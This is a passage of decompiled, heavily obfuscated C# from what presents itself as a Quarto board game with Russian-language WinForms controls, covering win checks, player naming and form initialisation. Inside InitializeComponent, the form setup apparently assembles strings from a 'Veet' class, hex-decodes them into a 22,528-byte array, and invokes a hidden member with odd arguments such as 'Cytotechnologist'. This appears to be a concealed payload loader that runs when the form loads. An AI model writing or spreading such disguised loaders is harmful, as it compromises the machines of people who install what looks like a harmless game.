					continue;
				}
				case 60u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1514164839;
						continue;
					}
					goto IL_037f;
				case 59u:
				{
					int num40;
					int num41;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num40 = -641134351;
						num41 = -641134351;
					}
					else
					{
						num40 = -933168545;
						num41 = -933168545;
					}
					num = num40 ^ (int)(num2 * 1568037500);
					continue;
				}
				case 58u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1607279579) ^ 0x5D33126B;
						continue;
					}
					goto IL_03f5;
				case 57u:
				{
					int num22;
					int num23;
					if (mem[num3, 1] != null)
					{
						num22 = -12007866;
						num23 = -12007866;
					}
					else
					{
						num22 = -1422911292;
						num23 = -1422911292;
					}
					num = num22 ^ ((int)num2 * -814370064);
					continue;
				}
				case 56u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -1761984466) ^ 0x5CC86984;
						continue;
					}
					goto IL_0290;
				case 55u:
					flag = true;
					num = ((int)num2 * -1813415984) ^ 0x598E06F6;
					continue;
				case 54u:
					result = flag;
					num = 1008540864;
					continue;
				case 53u:
				{
					int num6;
					int num7;
					if (mem[num3, 1].Dark != mem[num3, 2].Dark)
					{
						num6 = 2048703263;
						num7 = 2048703263;
					}
					else
					{
						num6 = 581023915;
						num7 = 581023915;
					}
					num = num6 ^ (int)(num2 * 633914873);
					continue;
				}
				case 52u:
				{
					int num71;
					if (mem[0, num3].Point == mem[1, num3].Point)
					{
						num = 1032745591;
						num71 = 1032745591;
					}
					else
					{
						num = 709475924;
						num71 = 709475924;
					}
					continue;
				}
				case 51u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = (int)(num2 * 845692693) ^ -1787194556;
						continue;
					}
					goto IL_0290;
				case 50u:
					num19 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_00b7;
				case 49u:
				{
					int num68;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 1147266142;
						num68 = 1147266142;
					}
					else
					{
						num = 1397621204;
						num68 = 1397621204;
					}
					continue;
				}
				case 48u:
				{
					int num59;
					int num60;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num59 = 220691292;
						num60 = 220691292;
					}
					else
					{
						num59 = 860206565;
						num60 = 860206565;
					}
					num = num59 ^ ((int)num2 * -1360560026);
					continue;
				}
				case 46u:
					if (mem[3, num3] != null)
					{
						num = ((int)num2 * -1114171265) ^ 0x3D2A313E;
						continue;
					}
					goto IL_05e0;
				case 45u:
				{
					int num50;
					int num51;
					if (mem[1, num3].Point != mem[2, num3].Point)
					{
						num50 = 1651234893;
						num51 = 1651234893;
					}
					else
					{
						num50 = 1535720250;
						num51 = 1535720250;
					}
					num = num50 ^ (int)(num2 * 1393166833);
					continue;
				}
				case 44u:
					num = 1995672245;
					continue;
				case 43u:
				{
					int num45;
					int num46;
					if (mem[num3, 0] == null)
					{
						num45 = -2028276710;
						num46 = -2028276710;
					}
					else
					{
						num45 = -218142015;
						num46 = -218142015;
					}
					num = num45 ^ (int)(num2 * 710558586);
					continue;
				}
				case 42u:
					num = ((int)num2 * -10830096) ^ 0x254A9DAF;
					continue;
				case 41u:
				{
					int num39;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = 1287755120;
						num39 = 1287755120;
					}
					else
					{
						num = 1377819704;
						num39 = 1377819704;
					}
					continue;
				}
				case 40u:
				{
					int num35;
					if (mem[num3, 0].Square == mem[num3, 1].Square)
					{
						num = 1540350114;
						num35 = 1540350114;
					}
					else
					{
						num = 223573812;
						num35 = 223573812;
					}
					continue;
				}
				case 39u:
				{
					int num29;
					int num30;
					if (mem[2, 2] == null)
					{
						num29 = 48569744;
						num30 = 48569744;
					}
					else
					{
						num29 = 1780778669;
						num30 = 1780778669;
					}
					num = num29 ^ (int)(num2 * 1050605485);
					continue;
				}
				case 38u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = ((int)num2 * -1947878611) ^ -450746167;
						continue;
					}
					goto IL_0741;
				case 37u:
				{
					int num24;
					int num25;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num24 = -1389437547;
						num25 = -1389437547;
					}
					else
					{
						num24 = -1326811695;
						num25 = -1326811695;
					}
					num = num24 ^ ((int)num2 * -1016886651);
					continue;
				}
				case 36u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1640977119) ^ 0x12F5E7F5;
						continue;
					}
					goto IL_07b7;
				case 35u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 1744608250) ^ -1987789218;
						continue;
					}
					goto IL_07b7;
				case 34u:
				{
					int num11;
					int num12;
					if (mem[num3, 1].Square != mem[num3, 2].Square)
					{
						num11 = -1953714948;
						num12 = -1953714948;
					}
					else
					{
						num11 = -343804546;
						num12 = -343804546;
					}
					num = num11 ^ (int)(num2 * 1446060238);
					continue;
				}
				case 33u:
				{
					int num72;
					int num73;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num72 = -697767736;
						num73 = -697767736;
					}
					else
					{
						num72 = -990986635;
						num73 = -990986635;
					}
					num = num72 ^ (int)(num2 * 445298120);
					continue;
				}
				case 32u:
				{
					int num69;
					int num70;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num69 = 1594980262;
						num70 = 1594980262;
					}
					else
					{
						num69 = 2037045133;
						num70 = 2037045133;
					}
					num = num69 ^ (int)(num2 * 1264331576);
					continue;
				}
				case 31u:
					if (mem[0, 3] != null)
					{
						num = 1927688865;
						continue;
					}
					goto IL_00b6;
				case 30u:
				{
					int num65;
					int num66;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num65 = 927626446;
						num66 = 927626446;
					}
					else
					{
						num65 = 628718146;
						num66 = 628718146;
					}
					num = num65 ^ (int)(num2 * 598594755);
					continue;
				}
				case 29u:
				{
					int num61;
					int num62;
					if (mem[num3, 1].Big == mem[num3, 2].Big)
					{
						num61 = 1337776705;
						num62 = 1337776705;
					}
					else
					{
						num61 = 1762494695;
						num62 = 1762494695;
					}
					num = num61 ^ ((int)num2 * -1561764930);
					continue;
				}
				case 28u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 2093595472;
						continue;
					}
					goto IL_0741;
				case 27u:
				{
					int num56;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = 506863254;
						num56 = 506863254;
					}
					else
					{
						num = 2006369487;
						num56 = 2006369487;
					}
					continue;
				}
				case 26u:
				{
					int num52;
					int num53;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num52 = 194694996;
						num53 = 194694996;
					}
					else
					{
						num52 = 1374377271;
						num53 = 1374377271;
					}
					num = num52 ^ ((int)num2 * -42600099);
					continue;
				}
				case 25u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -325987451) ^ -1557097848;
						continue;
					}
					goto IL_00b6;
				case 24u:
				{
					int num49;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 31771413;
						num49 = 31771413;
					}
					else
					{
						num = 1972265965;
						num49 = 1972265965;
					}
					continue;
				}
				case 23u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 1817985844) ^ -1880012454;
						continue;
					}
					goto IL_00b6;
				case 22u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -1570485636) ^ 0x61803945;
						continue;
					}
					goto IL_05e0;
				case 21u:
				{
					int num43;
					int num44;
					if (mem[num3, 0].Big != mem[num3, 1].Big)
					{
						num43 = 94284010;
						num44 = 94284010;
					}
					else
					{
						num43 = 933192158;
						num44 = 933192158;
					}
					num = num43 ^ (int)(num2 * 549338695);
					continue;
				}
				case 20u:
					if (mem[0, num3] != null)
					{
						num = 193621428;
						continue;
					}
					goto IL_05e0;
				case 19u:
					num3++;
					num = (int)(num2 * 366165901) ^ -125244916;
					continue;
				case 18u:
				{
					int num37;
					int num38;
					if (mem[num3, 3] != null)
					{
						num37 = 1217919135;
						num38 = 1217919135;
					}
					else
					{
						num37 = 1860050668;
						num38 = 1860050668;
					}
					num = num37 ^ (int)(num2 * 226534796);
					continue;
				}
				case 17u:
					num28 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_0036;
				case 15u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)(num2 * 968630936) ^ -1215484280;
						continue;
					}
					goto IL_037f;
				case 14u:
				{
					int num33;
					int num34;
					if (mem[3, 3] == null)
					{
						num33 = 1262157795;
						num34 = 1262157795;
					}
					else
					{
						num33 = 406127188;
						num34 = 406127188;
					}
					num = num33 ^ (int)(num2 * 1484109825);
					continue;
				}
				case 13u:
					if (mem[2, num3] != null)
					{
						num = (int)((num2 * 928848111) ^ 0x5603D57D);
						continue;
					}
					goto IL_05e0;
				case 12u:
				{
					int num26;
					int num27;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num26 = 1135361207;
						num27 = 1135361207;
					}
					else
					{
						num26 = 30832446;
						num27 = 30832446;
					}
					num = num26 ^ ((int)num2 * -709436746);
					continue;
				}
				case 11u:
					flag2 = num3 < 4;
					num = 1903766615;
					continue;
				case 10u:
					num = 692610877;
					continue;
				case 9u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1047063535) ^ 0x30451FA0;
						continue;
					}
					goto IL_07b7;
				case 8u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = (int)((num2 * 280037796) ^ 0x4E399FE6);
						continue;
					}
					goto IL_0290;
				case 7u:
				{
					int num20;
					int num21;
					if (flag2)
					{
						num20 = -522932798;
						num21 = -522932798;
					}
					else
					{
						num20 = -213690835;
						num21 = -213690835;
					}
					num = num20 ^ ((int)num2 * -569222524);
					continue;
				}
				case 6u:
				{
					int num17;
					int num18;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num17 = -1652687292;
						num18 = -1652687292;
					}
					else
					{
						num17 = -93073135;
						num18 = -93073135;
					}
					num = num17 ^ ((int)num2 * -546725238);
					continue;
				}
				case 5u:
				{
					int num15;
					int num16;
					if (mem[0, 0] == null)
					{
						num15 = -1591280466;
						num16 = -1591280466;
					}
					else
					{
						num15 = -263961001;
						num16 = -263961001;
					}
					num = num15 ^ ((int)num2 * -2107880065);
					continue;
				}
				case 4u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -329121496) ^ -797621801;
						continue;
					}
					goto IL_07b7;
				case 3u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -1050100720) ^ -701873546;
						continue;
					}
					goto IL_03f5;
				case 2u:
				{
					int num8;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 2050205831;
						num8 = 2050205831;
					}
					else
					{
						num = 1249888703;
						num8 = 1249888703;
					}
					continue;
				}
				case 1u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -35727358) ^ 0x7BCA5E66;
						continue;
					}
					goto IL_03f5;
				case 0u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = ((int)num2 * -751422840) ^ 0x3F1EBB60;
						continue;
					}
					goto IL_0035;
				case 16u:
					break;
				default:
					{
						return result;
					}
					IL_07b7:
					num19 = 1;
					goto IL_00b7;
					IL_00b7:
					flag3 = (byte)num19 != 0;
					num = 1111041645;
					continue;
					IL_0741:
					num28 = 0;
					goto IL_0036;
					IL_0290:
					num28 = 1;
					goto IL_0036;
					IL_00b6:
					num19 = 0;
					goto IL_00b7;
					IL_03f5:
					num19 = 1;
					goto IL_00b7;
					IL_0035:
					num28 = 1;
					goto IL_0036;
					IL_037f:
					num19 = 0;
					goto IL_00b7;
					IL_05e0:
					num28 = 0;
					goto IL_0036;
					IL_0036:
					flag4 = (byte)num28 != 0;
					num = 249262577;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num = 0;
		bool flag2 = default(bool);
		bool flag4 = default(bool);
		bool result = default(bool);
		bool flag3 = default(bool);
		int num4 = default(int);
		while (true)
		{
			int num2 = -1490804338;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xBD0FCDEFu) % 14u)
				{
				case 13u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 1855082696;
						num10 = 1855082696;
					}
					else
					{
						num9 = 1756472164;
						num10 = 1756472164;
					}
					num2 = num9 ^ (int)(num3 * 774026278);
					continue;
				}
				case 12u:
				{
					int num7;
					int num8;
					if (flag4)
					{
						num7 = -1946610728;
						num8 = -1946610728;
					}
					else
					{
						num7 = -203291383;
						num8 = -203291383;
					}
					num2 = num7 ^ ((int)num3 * -1816294012);
					continue;
				}
				case 10u:
					result = flag;
					num2 = ((int)num3 * -1301344240) ^ 0x67C6704;
					continue;
				case 9u:
					flag = false;
					num2 = ((int)num3 * -9674513) ^ -662766131;
					continue;
				case 8u:
					flag3 = num4 < 4;
					num2 = -150668892;
					continue;
				case 7u:
					num4 = 0;
					num2 = -1407830269;
					continue;
				case 5u:
					num2 = (int)(num3 * 503199609) ^ -1591397050;
					continue;
				case 4u:
					flag4 = num < 4;
					num2 = -1084513089;
					continue;
				case 3u:
					num4++;
					num2 = -1407830269;
					continue;
				case 2u:
					num++;
					num2 = (int)((num3 * 1912511082) ^ 0x39C6E837);
					continue;
				case 1u:
				{
					int num5;
					int num6;
					if (!flag3)
					{
						num5 = -2045162019;
						num6 = -2045162019;
					}
					else
					{
						num5 = -1768093959;
						num6 = -1768093959;
					}
					num2 = num5 ^ ((int)num3 * -1782562590);
					continue;
				}
				case 0u:
					flag2 = mem[num, num4] == null;
					num2 = -1664337332;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 895223890;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7040080u) % 10u)
				{
				case 9u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)((num2 * 233795138) ^ 0x7FC9644C);
					continue;
				case 8u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -2009303792) ^ -282335362;
					continue;
				case 7u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -88650305) ^ -2016302450;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 933150089) ^ 0xC7CE965);
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)(num2 * 593316094) ^ -565741482;
					continue;
				case 4u:
					num = ((int)num2 * -194415953) ^ -335751637;
					continue;
				case 3u:
					num = (int)((num2 * 223506206) ^ 0x2AF6B213);
					continue;
				case 1u:
					num = (int)((num2 * 1416905429) ^ 0xECC1566);
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		while (true)
		{
			int num = -2073277360;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0xFBCDB0AEu) % 7u)
				{
				case 6u:
					num = (int)(num2 * 1456720610) ^ -759785798;
					continue;
				case 4u:
					Form1.smethod_51((IDisposable)components);
					num = (int)((num2 * 1565319236) ^ 0x5681ADC2);
					continue;
				case 3u:
					if (disposing)
					{
						num = (int)((num2 * 1918503040) ^ 0x6C471157);
						continue;
					}
					goto IL_0050;
				case 2u:
					((Form)this).Dispose(disposing);
					num = -33236995;
					continue;
				case 1u:
					if (components != null)
					{
						num = -752617238;
						num3 = -752617238;
						continue;
					}
					goto IL_0050;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
					IL_0050:
					num = -801693742;
					num3 = -801693742;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Expected O, but got Unknown
		byte[] array = default(byte[]);
		bool flag = default(bool);
		int num5 = default(int);
		object[] object_ = default(object[]);
		string string_ = default(string);
		while (true)
		{
			int num = -657135858;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD783E974u) % 120u)
				{
				case 119u:
					CharArray(array, string.Empty);
					num = (int)(num2 * 1908211715) ^ -834778611;
					continue;
				case 118u:
					num = (int)(num2 * 267994539) ^ -119839458;
					continue;
				case 117u:
					num = ((int)num2 * -1765112774) ^ -1763560128;
					continue;
				case 116u:
					num = (int)(num2 * 1248639800) ^ -1793481042;
					continue;
				case 115u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)((num2 * 2132269613) ^ 0x378AFA73);
					continue;
				case 114u:
					num = (int)((num2 * 964287110) ^ 0x51F0BF46);
					continue;
				case 113u:
					num = (int)((num2 * 329228584) ^ 0x6AE02336);
					continue;
				case 112u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 2059715812) ^ 0x252239AF);
					continue;
				case 111u:
					num = (int)((num2 * 399978562) ^ 0x94B0619);
					continue;
				case 110u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 794193106) ^ -810867636;
					continue;
				case 109u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1633686480) ^ -154403681;
					continue;
				case 108u:
					num = ((int)num2 * -1449348682) ^ 0x2E28A02B;
					continue;
				case 107u:
					num = (int)(num2 * 303546084) ^ -703551883;
					continue;
				case 106u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)(num2 * 325967666) ^ -713977612;
					continue;
				case 105u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1228345146) ^ 0x57D3FAF9;
					continue;
				case 104u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -614340064) ^ 0x1DD808D3;
					continue;
				case 103u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -244384395) ^ -1071388444;
					continue;
				case 102u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -2051877522) ^ 0x1ACDF961;
					continue;
				case 101u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 1420066425) ^ -1612460530;
					continue;
				case 100u:
					num = ((int)num2 * -178322230) ^ 0x3B57AA3;
					continue;
				case 99u:
					Form1.smethod_64((Control)(object)label6, 13);
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 568191978) ^ -677529462;
					continue;
				case 98u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -146494187) ^ 0x1E450859;
					continue;
				case 97u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1663309398) ^ 0x3396B1CB;
					continue;
				case 96u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 1227705911) ^ 0x7B59C02C);
					continue;
				case 95u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -2015839993) ^ 0x31DD9D2B;
					continue;
				case 94u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -1142193671) ^ 0x7CB698D8;
					continue;
				case 93u:
					num = -714229994;
					continue;
				case 92u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)(num2 * 1222534477) ^ -1867944700;
					continue;
				case 91u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)((num2 * 1921561008) ^ 0x3EC7CAF4);
					continue;
				case 90u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -81193229) ^ -1768759727;
					continue;
				case 89u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -162150050) ^ 0x37E2BCB7;
					continue;
				case 88u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -905471149) ^ -1801263424;
					continue;
				case 87u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)(num2 * 1069304642) ^ -1726066486;
					continue;
				case 86u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -729228467) ^ -1788167056;
					continue;
				case 85u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -61406885) ^ 0x498D437C;
					continue;
				case 84u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 919357020) ^ 0x62FDC000);
					continue;
				case 83u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1360907210) ^ -813520628;
					continue;
				case 82u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1934433944) ^ 0x6DA7EA38;
					continue;
				case 81u:
					num = ((int)num2 * -291620702) ^ 0x32600B6F;
					continue;
				case 80u:
					Form1.smethod_72(timer1, 1000);
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -1521389696) ^ -414670473;
					continue;
				case 79u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -445935792) ^ -973031470;
					continue;
				case 78u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -885757861) ^ 0x55175662;
					continue;
				case 77u:
					num = ((int)num2 * -938980839) ^ 0x6C727C8C;
					continue;
				case 76u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1785091639) ^ -153723302;
					continue;
				case 75u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -611916080) ^ 0x6C76C291;
					continue;
				case 74u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -635474838) ^ -724572111;
					continue;
				case 73u:
					num = ((int)num2 * -1693116078) ^ 0x511782E7;
					continue;
				case 72u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1182427114) ^ 0xB2E0E60);
					continue;
				case 71u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)((num2 * 648962070) ^ 0x210EE865);
					continue;
				case 70u:
					num = (int)((num2 * 1653704031) ^ 0x442F89BA);
					continue;
				case 69u:
					num = ((int)num2 * -1715772926) ^ 0x3EAECD14;
					continue;
				case 68u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 1237835949) ^ 0x13C3B43);
					continue;
				case 67u:
					num = ((int)num2 * -344533227) ^ -1012079319;
					continue;
				case 66u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 2085185803) ^ -471829332;
					continue;
				case 65u:
					num = ((int)num2 * -1496067256) ^ 0x34928815;
					continue;
				case 64u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1658190708) ^ 0x46A35BDE;
					continue;
				case 63u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 1698065645) ^ 0x7C8B5A9E);
					continue;
				case 62u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 858876833) ^ 0x26D1A32F);
					continue;
				case 61u:
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					num = (int)(num2 * 1605206407) ^ -711537462;
					continue;
				case 60u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)((num2 * 1631507186) ^ 0x7CE3EDCB);
					continue;
				case 59u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -619392544) ^ -29612078;
					continue;
				case 58u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -2081552210) ^ -1462140777;
					continue;
				case 57u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -54179274) ^ 0x52E335E9;
					continue;
				case 56u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -80952382) ^ 0x40E11A7;
					continue;
				case 55u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 485326602) ^ 0x1911C321);
					continue;
				case 54u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 592742218) ^ 0x4EE692DC);
					continue;
				case 53u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -1929112795) ^ -1277124580;
					continue;
				case 52u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -888422282) ^ -1663345593;
					continue;
				case 51u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)(num2 * 198156036) ^ -2114438111;
					continue;
				case 49u:
					flag = num5 < 22528;
					num = -605728536;
					continue;
				case 48u:
					num = ((int)num2 * -1295221342) ^ -1177194005;
					continue;
				case 47u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)((num2 * 1330436371) ^ 0x565D2C24);
					continue;
				case 46u:
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 808331665) ^ 0x7FC7677A);
					continue;
				case 45u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -609251359) ^ -561792150;
					continue;
				case 44u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1613789240) ^ -1924025045;
					continue;
				case 43u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -557611834) ^ 0x77BA2804;
					continue;
				case 42u:
					array[num5] = Form1.smethod_69(Form1.smethod_68(string_, num5 * 2, 2), 16);
					num5++;
					num = ((int)num2 * -586541484) ^ 0x47CEBAA5;
					continue;
				case 41u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -873838248) ^ -1896945334;
					continue;
				case 40u:
					num = ((int)num2 * -183411614) ^ -400092099;
					continue;
				case 39u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -2021070031) ^ 0x19FA24B5;
					continue;
				case 38u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					string_ = Veet.Sa;
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)((num2 * 1447777029) ^ 0x17E29D6F);
					continue;
				case 37u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num5 = 0;
					num = (int)((num2 * 621745596) ^ 0x66D3E7FA);
					continue;
				case 36u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)(num2 * 498390822) ^ -289574069;
					continue;
				case 35u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 1807649154) ^ -2137669774;
					continue;
				case 34u:
					num = (int)((num2 * 961338512) ^ 0x101B8930);
					continue;
				case 33u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -106114466) ^ 0x2962A417;
					continue;
				case 32u:
					num = ((int)num2 * -1725600307) ^ -310675038;
					continue;
				case 31u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -2025690957) ^ -746279247;
					continue;
				case 30u:
					Form1.smethod_5((Control)(object)this, Color.White);
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1685396556) ^ 0x72B729D2;
					continue;
				case 29u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)(num2 * 1706251132) ^ -421459419;
					continue;
				case 28u:
					num = ((int)num2 * -200378176) ^ 0x1E23EC0;
					continue;
				case 27u:
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -964262237) ^ -1488941132;
					continue;
				case 26u:
					num = ((int)num2 * -1551126085) ^ 0x5947093B;
					continue;
				case 25u:
					panel1 = Form1.smethod_55();
